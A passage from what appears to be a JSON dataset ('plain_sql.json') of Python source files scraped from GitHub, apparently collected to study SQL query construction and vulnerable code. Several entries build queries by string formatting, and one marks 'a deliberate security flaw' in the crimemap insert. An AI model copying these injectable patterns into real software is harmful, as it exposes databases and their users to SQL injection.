print('Symbol {}, interval {}: Table already exists in database. No data has been downloaded.'.format(symbol, interval))\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/repodevs/flask-crimemap/blob/e590a3bd9dda4b6bc008efcfa1d3c12b603f7f66",
        "file_path": "/dbhelper.py",
        "source": "# -*- coding: utf-8 -*-\nimport pymysql\nimport db_config\n\n\nclass DBHelper:\n    \n    def connect(self, database=\"crimemap\"):\n        return pymysql.connect(host='localhost',\n                    user=db_config.db_user,\n                    password=db_config.db_password,\n                    db=database)\n\n    def get_all_inputs(self):\n        connection = self.connect()\n        try:\n            query = \"SELECT description FROM crimes;\"\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n            return cursor.fetchall()\n        finally:\n            connection.close()\n\n    def add_input(self, data):\n        connection = self.connect()\n        try:\n            # The following introduces a deliberate security flaw\n            query = \"INSERT INTO crimes (description) VALUES ('{}');\".format(data)\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n                connection.commit()\n        finally:\n            connection.close()\n\n    def clear_all(self):\n        connection = self.connect()\n        try:\n            query = \"DELETE FROM crimes;\"\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n                connection.commit()\n        finally:\n            connection.close()\n    \n\n\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/jwngr/sdow/blob/1e5d447e3131abe29f5757f035dc18f5995ae7cd",
        "file_path": "/scripts/createMockDatabase.py",
        "source": "import sqlite3\n\nmock_database_filename = 'sdow.sqlite'\n\nprint '[INFO] Creating mock database: {0}'.format(mock_database_filename)\n\nconn = sqlite3.connect(mock_database_filename)\n\nconn.execute('DROP TABLE IF EXISTS pages')\nconn.execute('CREATE TABLE pages(id INTEGER PRIMARY KEY, name TEXT)')\n\nfor page_id in range(1, 101):\n  page_name = '{0}_{1}'.format(page_id, page_id)\n  conn.execute('INSERT INTO pages VALUES ({0}, \"{1}\")'.format(page_id, page_name))\n\nconn.execute('DROP TABLE IF EXISTS redirects')\nconn.execute('CREATE TABLE redirects(from_id INTEGER PRIMARY KEY, to_id INTEGER)')\n\nfor page_id in range(50, 60):\n  conn.execute('INSERT INTO redirects VALUES ({0}, {1})'.format(page_id, page_id + 10))\n\nconn.execute('DROP TABLE IF EXISTS links')\nconn.execute('CREATE TABLE links(from_id INTEGER, to_id INTEGER, PRIMARY KEY (from_id, to_id)) WITHOUT ROWID;')\n\nconn.execute('INSERT INTO links VALUES (1, 2)')\nconn.execute('INSERT INTO links VALUES (1, 4)')\nconn.execute('INSERT INTO links VALUES (1, 5)')\nconn.execute('INSERT INTO links VALUES (1, 10)')\nconn.execute('INSERT INTO links VALUES (2, 1)')\nconn.execute('INSERT INTO links VALUES (2, 3)')\nconn.execute('INSERT INTO links VALUES (2, 10)')\nconn.execute('INSERT INTO links VALUES (3, 4)')\nconn.execute('INSERT INTO links VALUES (3, 11)')\nconn.execute('INSERT INTO links VALUES (4, 1)')\nconn.execute('INSERT INTO links VALUES (4, 6)')\nconn.execute('INSERT INTO links VALUES (4, 9)')\nconn.execute('INSERT INTO links VALUES (5, 6)')\nconn.execute('INSERT INTO links VALUES (7, 8)')\nconn.execute('INSERT INTO links VALUES (8, 7)')\nconn.execute('INSERT INTO links VALUES (9, 3)')\nconn.execute('INSERT INTO links VALUES (11, 12)')\nconn.execute('INSERT INTO links VALUES (13, 12)')\nconn.execute('INSERT INTO links VALUES (15, 16)')\nconn.execute('INSERT INTO links VALUES (15, 17)')\nconn.execute('INSERT INTO links VALUES (16, 17)')\nconn.execute('INSERT INTO links VALUES (16, 18)')\nconn.execute('INSERT INTO links VALUES (17, 18)')\nconn.execute('INSERT INTO links VALUES (18, 19)')\nconn.execute('INSERT INTO links VALUES (19, 20)')\nconn.execute('INSERT INTO links VALUES (21, 20)')\nconn.execute('INSERT INTO links VALUES (22, 20)')\n\nconn.commit()\n\nprint '[INFO] Successfully created mock database: {0}'.format(mock_database_filename)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/jwngr/sdow/blob/1e5d447e3131abe29f5757f035dc18f5995ae7cd",
        "file_path": "/sdow/database.py",
        "source": "'''\nWrapper for connecting to the SDOW database.\n'''\n\nimport os.path\nimport sqlite3\nimport sdow.helpers as helpers\nfrom sdow.breadth_first_search import breadth_first_search\n\n\nclass Database():\n  '''\n  Wrapper for connecting to the SDOW database.\n  '''\n  def __init__(self, sqlite_filename):\n    if not os.path.isfile(sqlite_filename):\n      raise IOError('Specified SQLite file \"{0}\" does not exist.'.format(sqlite_filename))\n\n    self.conn = sqlite3.connect(sqlite_filename)\n    self.cursor = self.conn.cursor()\n\n    # TODO: measure the performance impact of this\n    self.cursor.arraysize = 1000\n\n  def __del__(self):\n    self.conn.close()\n\n  def fetch_page_id(self, page_name):\n    '''\n    Returns the page ID corresponding to the provided page name.\n\n    Args:\n      page_name: The page name whose ID to fetch.\n\n    Returns:\n      int: The page ID corresponding to the provided page name.\n\n    Raises:\n      ValueError: If the provided page name is invalid or does not exist.\n    '''\n    helpers.validate_page_name(page_name)\n\n    sanitized_page_name = page_name.replace(' ', '_')\n\n    print 'sanitized_page_name: {0}'.format(sanitized_page_name)\n\n    query = 'SELECT id FROM pages WHERE name=\"{0}\"'.format(sanitized_page_name)\n    self.cursor.execute(query)\n\n    page_id = self.cursor.fetchone()\n\n    if not page_id:\n      raise ValueError('Invalid page name {0} provided. Page name does not exist.'.format(page_name))\n\n    return page_id[0]\n\n\n  def fetch_page_name(self, page_id):\n    '''\n    Returns the page name corresponding to the provided page ID.\n\n    Args:\n      page_id: The page ID whose ID to fetch.\n\n    Returns:\n      str: The page name corresponding to the provided page ID.\n\n    Raises:\n      ValueError: If the provided page ID is invalid or does not exist.\n    '''\n    helpers.validate_page_id(page_id)\n\n    query = 'SELECT name FROM pages WHERE id=\"{0}\"'.format(page_id)\n    self.cursor.execute(query)\n\n    page_name = self.cursor.fetchone()\n\n    if not page_name:\n      raise ValueError('Invalid page ID \"{0}\" provided. Page ID does not exist.'.format(page_id))\n\n    return page_name[0].encode('utf-8').replace('_', ' ')\n\n\n  def fetch_redirected_page_id(self, from_page_id):\n    '''\n    If the provided page ID is a redirect, returns the ID of the page to which it redirects.\n    Otherwise, returns None.\n\n    Args:\n      from_page_id: The page ID whose redirected page ID to fetch.\n\n    Returns:\n      int: The ID of the page to which the provided page ID redirects.\n      OR\n      None: If the provided page ID is not a redirect.\n\n    Raises:\n      ValueError: If the provided page ID is invalid.\n    '''\n    helpers.validate_page_id(from_page_id)\n\n    query = 'SELECT to_id FROM redirects WHERE from_id=\"{0}\"'.format(from_page_id)\n    self.cursor.execute(query)\n\n    to_page_id = self.cursor.fetchone()\n\n    return to_page_id and to_page_id[0]\n\n  def compute_shortest_paths(self, from_page_id, to_page_id):\n    '''\n    Returns a list of page IDs indicating the shortest path between the from and to page IDs.\n\n    Args:\n      from_page_id: The ID corresponding to the page at which to start the search.\n      to_page_id: The ID corresponding to the page at which to end the search.\n\n    Returns:\n      [[int]]: A list of integer lists corresponding to the page IDs indicating the shortest path\n               between the from and to page IDs.\n\n    Raises:\n      ValueError: If either of the provided page IDs are invalid.\n    '''\n    helpers.validate_page_id(from_page_id)\n    helpers.validate_page_id(to_page_id)\n\n    return breadth_first_search(from_page_id, to_page_id, self)\n\n  def fetch_forwards_links(self, page_ids):\n    '''\n    Returns a list of tuples of page IDs representing forwards links from the list of provided page\n    IDs to other pages.\n\n    Args:\n      page_ids: The page IDs whose forwards links to fetch.\n\n    Returns:\n      [(int, int)]: A lists of integer tuples representing forwards links from the list of provided\n                    page IDs to other pages.\n    '''\n    return self.fetch_links_helper(page_ids, 'from_id')\n\n  def fetch_backwards_links(self, page_ids):\n    '''\n    Returns a list of tuples of page IDs representing backwards links from the list of provided page\n    IDs to other pages.\n\n    Args:\n      page_ids: The page IDs whose backwards links to fetch.\n\n    Returns:\n      [(int, int)]: A lists of integer tuples representing backwards links from the list of provided\n                    page IDs to other pages.\n    '''\n    return self.fetch_links_helper(page_ids, 'to_id')\n\n  def fetch_links_helper(self, page_ids, to_id_or_from_id):\n    '''\n    Helper function which handles duplicate logic for fetch_forwards_links() and\n    fetch_backwards_links().\n\n    Args:\n      page_ids: The page IDs whose links to fetch.\n      to_id_or_from_id: String which indicates whether to fetch forwards (\"from_id\") or backwards\n                        (\"to_id\") links.\n\n    Returns:\n      [(int, int)]: A lists of integer tuples representing links from the list of provided page IDs\n                    to other pages.\n    '''\n\n    query = 'SELECT from_id, to_id FROM links WHERE {0} IN {1}'.format(to_id_or_from_id, page_ids)\n\n    #results = []\n    #for row in self.cursor.execute(query):\n    #  results.append(row)\n\n    # TODO: measure the performance impact of this versus just appending to an array (above) or\n    # just returning the cursor (not yet implemented)\n    self.cursor.execute(query)\n\n    return self.cursor.fetchall()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/tfalbo/SuzyMakeup/blob/e4cba29ea89e8cdf0e49c1e64534f8c2dfd4469c",
        "file_path": "/vagrant/forum/forumdb.py",
        "source": "# \"Database code\" for the DB Forum.\n\nimport psycopg2\n\nDBNAME = \"forum\"\n\ndef get_posts():\n  \"\"\"Return all posts from the 'database', most recent first.\"\"\"\n  db = psycopg2.connect(database=DBNAME)\n  c = db.cursor()\n  c.execute(\"select content,time from posts order by time desc\")\n  return c.fetchall()\n  db.close()\n\ndef add_post(content):\n  \"\"\"Add a post to the 'database' with the current timestamp.\"\"\"\n  db = psycopg2.connect(database=DBNAME)\n  c = db.cursor()\n  c.execute(\"insert into posts values('%s')\" % content)\n  db.commit()\n  db.close()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/RedHatInsights/vmaas/blob/d07c6ed23cfaad9ed674ec4e219e5a819b3255cd",
        "file_path": "/webapp/cve.py",
        "source": "\"\"\"\nModule contains functions and CVE class for returning data from DB\n\"\"\"\n\n\nclass CVE:\n    \"\"\"\n    Class to hold CVE attributes\n    \"\"\"\n    cve_cwe_map = None\n\n    def __init__(self, cve_entry, column_names):\n        for col_name in column_names:\n            setattr(self, col_name, cve_entry[column_names.index(col_name)])\n        self.cwe = self.associate_cwes()\n\n    def associate_cwes(self):\n        \"\"\"\n        Assigns cve to cwe and creates a list\n        :return:\n        \"\"\"\n        cwe_map = []\n        if CVE.cve_cwe_map is not None:\n            cwe_map = [item[1] for item in CVE.cve_cwe_map if self.get_val(\"cve.id\") == item[0]]\n        return cwe_map\n\n    def get_val(self, attr_name):\n        \"\"\"\n        Return CVE attribute or None\n        :param attr_name: attr_name\n        :return: attribute\n        \"\"\"\n        value = None\n        if attr_name in vars(self):\n            value = getattr(self, attr_name)\n        return value\n\nclass CveAPI:\n    def __init__(self, cursor):\n        self.cursor = cursor\n\n    def process_list(self, data):\n        \"\"\"\n        This method returns details for given set of CVEs.\n\n        :param data: data obtained from api, we're interested in data[\"cve_list\"]\n\n        :returns: list of dictionaries containing detailed information for given cve list}\n\n        \"\"\"\n\n        cves_to_process = data[\"cve_list\"]\n        cves_to_process = filter(None, cves_to_process)\n        answer = {}\n        if not cves_to_process:\n            return answer\n\n        # Select all cves in request\n        column_names = [\"cve.id\", \"redhat_url\", \"secondary_url\", \"cve.name\", \"severity.name\", \"published_date\",\n                        \"modified_date\", \"iava\", \"description\"]\n        cve_query = \"SELECT %s from cve\" % ', '.join(column for column in column_names)\n        cve_query = cve_query + \" LEFT JOIN severity ON severity_id = severity.id\"\n        cve_query = cve_query + \" WHERE cve.name IN %s\"\n        self.cursor.execute(cve_query, [tuple(cves_to_process)])\n        cves = self.cursor.fetchall()\n        cwe_map = self.get_cve_cwe_map([cve[column_names.index(\"cve.id\")] for cve in cves])  # generate cve ids\n        CVE.cve_cwe_map = cwe_map\n        cve_list = []\n        for cve_entry in cves:\n            cve = CVE(cve_entry, column_names)\n            cve_list.append(cve)\n\n        return self.construct_answer(cve_list)\n\n\n    def get_cve_cwe_map(self, ids):\n        \"\"\"\n        For givers CVE ids find CWE in DB\n        :param ids: CVE ids\n        :return: cve_cwe mapping\n        \"\"\"\n        if not ids:\n            return []\n        query = \"SELECT cve_id, cwe.name, cwe.link FROM cve_cwe map JOIN cwe ON map.cwe_id = cwe.id WHERE map.cve_id IN %s\"\n        self.cursor.execute(query, [tuple(ids)])\n        return self.cursor.fetchall()\n\n\n    @staticmethod\n    def construct_answer(cve_list):\n        \"\"\"\n        Final dictionary generation\n        :param cve_list: which cves to show\n        :return: JSON ready dictionary\n        \"\"\"\n        response = {}\n        for cve in cve_list:\n            response[cve.get_val(\"cve.name\")] = {\n                \"redhat_url\": cve.get_val(\"redhat_url\"),\n                \"secondary_url\": cve.get_val(\"secondary_url\"),\n                \"synopsis\": cve.get_val(\"cve.name\"),\n                \"impact\": cve.get_val(\"severity.name\"),\n                \"public_date\": cve.get_val(\"published_date\"),\n                \"modified_date\": cve.get_val(\"modified_date\"),\n                \"iava\": cve.get_val(\"iava\"),\n                \"cwe_list\": cve.get_val(\"cwe\"),\n                \"description\": cve.get_val(\"description\"),\n            }\n        return response\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/RedHatInsights/vmaas/blob/d07c6ed23cfaad9ed674ec4e219e5a819b3255cd",
        "file_path": "/webapp/errata.py",
        "source": "\"\"\"\nModule contains classes for returning errata data from DB\n\"\"\"\n\nclass Errata:\n    \"\"\"\n    Class to hold Erratum attributes\n    \"\"\"\n\n    def __init__(self, id, name, synopsis, severity, description, solution, issued, updated):\n        setattr(self, \"name\", name)\n        setattr(self, \"id\", id)\n        mydict = {}\n        mydict[\"type\"] = None\n        mydict[\"issued\"] = str(issued)\n        mydict[\"synopsis\"] = synopsis\n        mydict[\"description\"] = description\n        mydict[\"solution\"] = solution\n        mydict[\"severity\"] = severity\n        mydict[\"summary\"] = None\n        mydict[\"updated\"] = str(updated)\n        mydict[\"url\"] = \"https://access.redhat.com/errata/%s\" % name\n        mydict[\"bugzilla_list\"] = []\n        mydict[\"cve_list\"] = []\n        mydict[\"package_list\"] = []\n        mydict[\"reference_list\"] = []\n        setattr(self, \"mydict\", mydict)\n\n    def set_cve_names(self, cve_name_list):\n        mydict = self.get_val(\"mydict\")\n        mydict[\"cve_list\"] = cve_name_list\n\n    def set_packages(self, package_list):\n        mydict = self.get_val(\"mydict\")\n        mydict[\"package_list\"] = package_list\n\n    def get_val(self, attr_name):\n        \"\"\"\n        Return Erratum attribute or None\n        :param attr_name: attr_name\n        :return: attribute\n        \"\"\"\n        value = None\n        if attr_name in vars(self):\n            value = getattr(self, attr_name)\n        return value\n\nclass ErrataAPI:\n    def __init__(self, cursor):\n        self.cursor = cursor\n\n    def get_cve_names_for_erratum_id(self, id):\n        \"\"\"\n        Get the list of cves for the given erratum id\n        \"\"\"\n        cve_query = \"SELECT name FROM cve\"\n        cve_query += \" JOIN errata_cve ON cve_id = cve.id\"\n        cve_query += \" WHERE errata_cve.errata_id = %s\" % str(id)\n        self.cursor.execute(cve_query)\n        cve_names = self.cursor.fetchall()\n        cve_name_list = []\n        for cve_name in cve_names:\n            cve_name_list.append(cve_name[0])\n        return cve_name_list\n\n    @staticmethod\n    def build_package_name(name, epoch, version, release, arch):\n        \"\"\"\n        Build a package name from the separate NEVRA parts\n        \"\"\"\n        package_name = name + \"-\"\n        if int(epoch) > 0:\n            package_name += \"%s:\" % epoch\n        package_name += \"%s-%s.%s\" % (version, release, arch)\n        return package_name\n\n    def get_package_list_for_erratum_id(self, id):\n        \"\"\"\n        Get the list of packages for the given erratum id\n        \"\"\"\n        pkg_query = \"SELECT package.name, evr.epoch, evr.version, evr.release, arch.name\"\n        pkg_query += \" FROM pkg_errata\"\n        pkg_query += \" JOIN package ON package.id = pkg_errata.pkg_id\"\n        pkg_query += \" JOIN evr ON evr.id = package.evr_id\"\n        pkg_query += \" JOIN arch ON arch.id = package.arch_id\"\n        pkg_query += \" WHERE pkg_errata.errata_id = %s\" % str(id)\n        self.cursor.execute(pkg_query)\n        result = self.cursor.fetchall()\n        package_list = []\n        for name, epoch, version, release, arch in result:\n            package_list.append(self.build_package_name(name, epoch, version, release, arch))\n        return package_list\n\n    def process_list(self, data):\n        \"\"\"\n        This method returns details for given set of Errata.\n\n        :param cursor: psycopg2 connection cursor\n        :param data: data obtained from api, we're interested in data[\"errata_list\"]\n\n        :returns: dictionary containing detailed information for given errata list}\n\n        \"\"\"\n\n        errata_to_process = data[\"errata_list\"]\n        errata_to_process = filter(None, errata_to_process)\n        answer = {}\n\n        if not errata_to_process:\n            return answer\n\n        # Select all errata in request\n        errata_query = \"SELECT errata.id, errata.name, synopsis, severity.name, description,\"\n        errata_query += \" solution, issued, updated\"\n        errata_query += \" FROM errata\"\n        errata_query += \" LEFT JOIN severity ON severity_id = severity.id\"\n        errata_query += \" WHERE errata.name IN %s\"\n        self.cursor.execute(errata_query, [tuple(errata_to_process)])\n        errata = self.cursor.fetchall()\n\n        erratum_list = []\n        for id, name, synopsis, severity, description, solution, issued, updated in errata:\n            new_erratum = Errata(id, name, synopsis, severity, description, solution, issued, updated)\n            new_erratum.set_cve_names(self.get_cve_names_for_erratum_id(id))\n            new_erratum.set_packages(self.get_package_list_for_erratum_id(id))\n            erratum_list.append(new_erratum)\n\n        errata_dict = {}\n        for e in erratum_list:\n            errata_dict[e.get_val(\"name\")] = e.get_val(\"mydict\")\n        answer[\"errata_list\"] = errata_dict\n        return answer\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/RedHatInsights/vmaas/blob/d07c6ed23cfaad9ed674ec4e219e5a819b3255cd",
        "file_path": "/webapp/updates.py",
        "source": "#!/usr/bin/python -u\n\n\ndef split_filename(filename):\n    \"\"\"\n    Pass in a standard style rpm fullname\n\n    Return a name, version, release, epoch, arch, e.g.::\n        foo-1.0-1.i386.rpm returns foo, 1.0, 1, 0, i386\n        bar-1:9-123a.ia64.rpm returns bar, 9, 123a, 1, ia64\n    \"\"\"\n\n    is_epoch = True if filename.find(':') != -1 else False\n\n    if filename[-4:] == '.rpm':\n        filename = filename[:-4]\n\n    arch_index = filename.rfind('.')\n    arch = filename[arch_index + 1:]\n\n    rel_index = filename[:arch_index].rfind('-')\n    rel = filename[rel_index + 1:arch_index]\n\n    if is_epoch:\n        ver_index = filename[:rel_index].rfind(':')\n    else:\n        ver_index = filename[:rel_index].rfind('-')\n    ver = filename[ver_index + 1:rel_index]\n\n\n    if is_epoch:\n        epoch_index = filename[:ver_index].rfind('-')\n        epoch = filename[epoch_index + 1:ver_index]\n    else:\n        epoch_index = ver_index\n        epoch = '0'\n\n    name = filename[:epoch_index]\n    return name, ver, rel, epoch, arch\n\n\nclass UpdatesAPI:\n    def __init__(self, cursor):\n        self.cursor = cursor\n\n    def process_list(self, data):\n        \"\"\"\n        This method is looking for updates of a package, including name of package to update to,\n        associated erratum and repository this erratum is from.\n\n        :param packages_to_process: list of package to find updates for every of them\n\n        :returns: updates for a package in format of list of dictionaries {'package': <p_name>, 'erratum': <e_name>,\n        'repository': <r_name>}\n\n        \"\"\"\n\n        packages_to_process = data['package_list']\n        auxiliary_dict = {}\n        answer = {}\n\n        if not packages_to_process:\n            return answer\n\n        provided_repo_ids = None\n        provided_repo_names = None\n\n        if 'repository_list' in data:\n            provided_repo_names = data['repository_list']\n            provided_repo_ids = []\n            self.cursor.execute(\"select id from repo where name in %s;\", [tuple(provided_repo_names)])\n            for id_tuple in self.cursor.fetchall():\n                for id in id_tuple:\n                    provided_repo_ids.append(id)\n\n        # Select all evrs and put them into dictionary\n        self.cursor.execute(\"SELECT id, epoch, version, release from evr\")\n        evrs = self.cursor.fetchall()\n        evr2id_dict = {}\n        id2evr_dict = {}\n        for id, e, v, r in evrs:\n            key = e + ':' + v + ':' + r\n            evr2id_dict[key] = id\n            id2evr_dict[id] = {'epoch': e, 'version': v, 'release': r}\n\n        # Select all archs and put them into dictionary\n        self.cursor.execute(\"SELECT id, name from arch\")\n        archs = self.cursor.fetchall()\n        arch2id_dict = {}\n        id2arch_dict = {}\n        for id, name in archs:\n            arch2id_dict[name] = id\n            id2arch_dict[id] = name\n\n        packages_names = []\n        packages_evrids = []\n\n        for pkg in packages_to_process:\n            pkg = str(pkg)\n\n            # process all packages form input\n            if pkg not in auxiliary_dict:\n                n, v, r, e, a = split_filename(str(pkg))\n                auxiliary_dict[pkg] = {}  # create dictionary with aux data for pkg\n\n                evr_key = e + ':' + v + ':' + r\n                if evr_key in evr2id_dict:\n                    packages_names.append(n)\n                    auxiliary_dict[pkg][n] = []\n\n                    evr_id = evr2id_dict[evr_key]\n                    packages_evrids.append(evr_id)\n                    auxiliary_dict[pkg]['evr_id'] = evr_id\n                    auxiliary_dict[pkg]['arch_id'] = arch2id_dict[a]\n                    auxiliary_dict[pkg]['repo_id'] = []\n                    auxiliary_dict[pkg]['pkg_id'] = []\n                    auxiliary_dict[pkg]['update_id'] = []\n\n        # Select all packages with given evrs ids and put them into dictionary\n        self.cursor.execute(\"select id, name, evr_id, arch_id from package where evr_id in %s;\",  [tuple(packages_evrids)])\n        packs = self.cursor.fetchall()\n        nevra2pkg_id = {}\n        for id, name, evr_id, arch_id in packs:\n            key = name + ':' + str(evr_id) + ':' + str(arch_id)\n            if key not in nevra2pkg_id:\n                nevra2pkg_id[key] = [id]\n            else:\n                nevra2pkg_id[key].append(id)\n\n        pkg_ids = []\n        for pkg in auxiliary_dict.keys():\n            n, v, r, e, a = split_filename(str(pkg))\n\n            try:\n                key = str(n + ':' + str(auxiliary_dict[pkg]['evr_id']) + ':' + str(auxiliary_dict[pkg]['arch_id']))\n                pkg_ids.extend(nevra2pkg_id[key])\n                auxiliary_dict[pkg]['pkg_id'].extend(nevra2pkg_id[key])\n            except KeyError:\n                pass\n\n        # Select all repo_id and add mapping to package id\n        self.cursor.execute(\"select pkg_id, repo_id from pkg_repo where pkg_id in %s;\", [tuple(pkg_ids)])\n        pack_repo_ids = self.cursor.fetchall()\n        pkg_id2repo_id = {}\n\n        repo_ids = []\n\n        for pkg_id, repo_id in pack_repo_ids:\n            repo_ids.append(repo_id)\n\n            if pkg_id in pkg_id2repo_id:\n                pkg_id2repo_id[pkg_id].append(repo_id)\n            else:\n                pkg_id2repo_id[pkg_id] = [repo_id]\n\n        for pkg in auxiliary_dict.keys():\n                try:\n                    for pkg_id in auxiliary_dict[pkg]['pkg_id']:\n                        auxiliary_dict[pkg]['repo_id'].extend(pkg_id2repo_id[pkg_id])\n                except KeyError:\n                    pass\n\n        self.cursor.execute(\"select name, id from package where name in %s;\", [tuple(packages_names)])\n        sql_result = self.cursor.fetchall()\n        names2ids = {}\n        for name, id in sql_result:\n\n            if name in names2ids:\n                names2ids[name].append(id)\n            else:\n                names2ids[name] = [id]\n\n        for pkg in auxiliary_dict.keys():\n            n, v, r, e, a = split_filename(str(pkg))\n\n            try:\n                auxiliary_dict[pkg][n].extend(names2ids[n])\n            except KeyError:\n                pass\n\n        update_pkg_ids = []\n\n        for pkg in auxiliary_dict:\n            n, v, r, e, a = split_filename(str(pkg))\n\n            if n in auxiliary_dict[pkg] and auxiliary_dict[pkg][n]:\n                sql = \"\"\"\n                select package.id from package join evr on package.evr_id = evr.id where package.id in %s and evr.evr > (select evr from evr where id = %s);\n                \"\"\" % ('%s', str(auxiliary_dict[pkg]['evr_id']))\n\n                self.cursor.execute(sql, [tuple(auxiliary_dict[pkg][n])])\n\n                for id in self.cursor.fetchall():\n                    auxiliary_dict[pkg]['update_id'].append(id[0])\n                    update_pkg_ids.append(id[0])\n\n        # Select all info about repos\n        self.cursor.execute(\"select id, name, url from repo where id in %s;\", [tuple(repo_ids)])\n        all_repos = self.cursor.fetchall()\n        repoinfo_dict = {}\n        for id, name, url in all_repos:\n            repoinfo_dict[id] = {'name': name, 'url': url}\n\n        # Select all info about pkg_id to repo_id\n        self.cursor.execute(\"select pkg_id, repo_id from pkg_repo where pkg_id in %s;\", [tuple(update_pkg_ids)])\n        all_pkg_repos = self.cursor.fetchall()\n        pkg_id2repo_id = {}\n        for pkg_id, repo_id in all_pkg_repos:\n\n            if pkg_id not in pkg_id2repo_id:\n                pkg_id2repo_id[pkg_id] = [repo_id]\n            else:\n                pkg_id2repo_id[pkg_id].append(repo_id)\n\n        # Select all info about pkg_id to errata_id\n        self.cursor.execute(\"select pkg_id, errata_id from pkg_errata where pkg_id in %s;\", [tuple(update_pkg_ids)])\n        all_pkg_errata = self.cursor.fetchall()\n        pkg_id2errata_id = {}\n        all_errata = []\n        for pkg_id, errata_id in all_pkg_errata:\n            all_errata.append(errata_id)\n            if pkg_id not in pkg_id2errata_id:\n                pkg_id2errata_id[pkg_id] = [errata_id]\n            else:\n                pkg_id2errata_id[pkg_id].append(errata_id)\n\n        # Select all info about errata\n        self.cursor.execute(\"SELECT id, name from errata where id in %s;\", [tuple(all_errata)])\n        errata = self.cursor.fetchall()\n        id2errata_dict = {}\n        all_errata_id = []\n        for id, name in errata:\n            id2errata_dict[id] = name\n            all_errata_id.append(id)\n\n        self.cursor.execute(\"SELECT errata_id, repo_id from errata_repo where errata_id in %s;\", [tuple(all_errata_id)])\n        sql_result = self.cursor.fetchall()\n        errata_id2repo_id = {}\n        for errata_id, repo_id in sql_result:\n            if errata_id not in errata_id2repo_id:\n                errata_id2repo_id[errata_id] = [repo_id]\n            else:\n                errata_id2repo_id[errata_id].append(repo_id)\n\n        # Select all info about packages\n        self.cursor.execute(\"SELECT id, name, evr_id, arch_id from package where id in %s;\", [tuple(update_pkg_ids)])\n        packages = self.cursor.fetchall()\n        pkg_id2full_name = {}\n        pkg_id2arch_id = {}\n        for id, name, evr_id, arch_id in packages:\n            full_rpm_name = name + '-'\n            if id2evr_dict[evr_id]['epoch'] != '0':\n                full_rpm_name += id2evr_dict[evr_id]['epoch'] + ':'\n            full_rpm_name += id2evr_dict[evr_id]['version'] + '-' + id2evr_dict[evr_id]['release'] + '.' + id2arch_dict[arch_id]\n\n            pkg_id2full_name[id] = full_rpm_name\n            pkg_id2arch_id[id] = arch_id\n\n        for pkg in auxiliary_dict:\n            answer[pkg] = []\n\n            if 'update_id' not in auxiliary_dict[pkg]:\n                continue\n\n            for upd_pkg_id in auxiliary_dict[pkg]['update_id']:\n                # FIXME: use compatibility tables instead of exact matching\n                if auxiliary_dict[pkg]['arch_id'] == pkg_id2arch_id[upd_pkg_id]:\n                    for r_id in pkg_id2repo_id[upd_pkg_id]:\n                        # check if update package in the same repo with original one\n                        # and if the list of repositories for updates is provided, also check repo id in this list\n                        if r_id in auxiliary_dict[pkg]['repo_id'] and \\\n                                (provided_repo_ids is None or r_id in provided_repo_ids):\n                            # Some pkgs don't have associated errata (eg, original-repo-content)\n                            if upd_pkg_id in pkg_id2errata_id:\n                                errata_ids = pkg_id2errata_id[upd_pkg_id]\n                                for e_id in errata_ids:\n                                    # check current errata in the same repo with update pkg\n                                    if r_id in errata_id2repo_id[e_id]:\n                                        e_name = id2errata_dict[e_id]\n                                        r_name = repoinfo_dict[r_id]['name']\n\n                                        answer[pkg].append({\n                                            'package': pkg_id2full_name[upd_pkg_id],\n                                            'erratum': e_name,\n                                            'repository': r_name})\n        response = {\n            'update_list': answer,\n        }\n\n        if provided_repo_ids is not None:\n            response.update({'repository_list': provided_repo_names})\n\n        return response\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/ValheKouneli/SkrolliEditor/blob/7aa62683ec3b9228dbc528e9381a121ca61a1f05",
        "file_path": "/application/issues/views.py",
        "source": "from flask import render_template, request, redirect, url_for\nfrom flask_login import login_user, login_required, logout_user, current_user\n\nfrom application import app, db\nfrom application.help import getArticlesWithCondition\nfrom application.articles.models import Article\nfrom application.articles.forms import ArticleForm\nfrom application.help import getEditorOptions, getIssueOptions, getPeopleOptions\nfrom application.issues.models import Issue\nfrom application.issues.forms import IssueForm\n\nfrom sqlalchemy.sql import text\n\n@app.route(\"/issues/\", methods=[\"GET\"])\ndef issues_index():\n    query = text(\n        \"SELECT issue.id, issue.name FROM issue ORDER BY issue.name\"\n    )\n    issues = db.engine.execute(query)\n    return render_template(\"/issues/list.html\", current_user=current_user, issues = issues)\n\n@app.route(\"/<issue>/articles/\", methods=[\"GET\"])\ndef articles_in_issue(issue):\n    try:\n        issueid = Issue.query.filter_by(name=issue).first().id\n    except:\n        return redirect(url_for(\"error404\"))\n\n    return render_template(\"articles/editor_view.html\", \n        planned_articles = Article.get_all_planned_articles(int(issueid)),\n        draft_articles = Article.get_all_draft_articles(int(issueid)),\n        written_articles = Article.get_all_written_articles(int(issueid)),\n        edited_articles = Article.get_all_edited_articles(int(issueid)),\n        finished_articles = Article.get_all_finished_articles(int(issueid)))\n\n@app.route(\"/<issue>/articles/new\", methods=[\"GET\"])\n@login_required\ndef articles_create_for_issue(issue):\n    try:\n        issueid = Issue.query.filter_by(name=issue).first().id\n    except:\n        return redirect(url_for(\"error404\"))\n    \n    if not current_user.editor:\n        return redirect(url_for(\"error403\"))\n\n    form = ArticleForm()\n    form.writer.choices = getPeopleOptions()\n    form.editorInCharge.choices = getEditorOptions()\n    form.issue.choices = getIssueOptions()\n    form.issue.data = issueid\n\n    return render_template(\"/articles/new.html\", form=form)\n\n@app.route(\"/issues/new/\", methods=[\"GET\", \"POST\"])\n@login_required\ndef issues_create():\n    if request.method == \"GET\":\n        form = IssueForm()\n        return render_template(\"/issues/new.html\", form=form)\n    \n    if not current_user.editor:\n        return redirect(url_for(\"error401\"))\n\n    form = IssueForm(request.form)\n\n    if not form.validate():\n        return render_template(\"issues/new.html\", form = form)\n    \n    issue = Issue(form.name.data)\n    db.session.add(issue)\n    db.session.commit()\n\n    return redirect(url_for(\"issues_index\"))\n\n@app.route(\"/<issue_id>/delete\", methods=[\"POST\"])\n@login_required\ndef 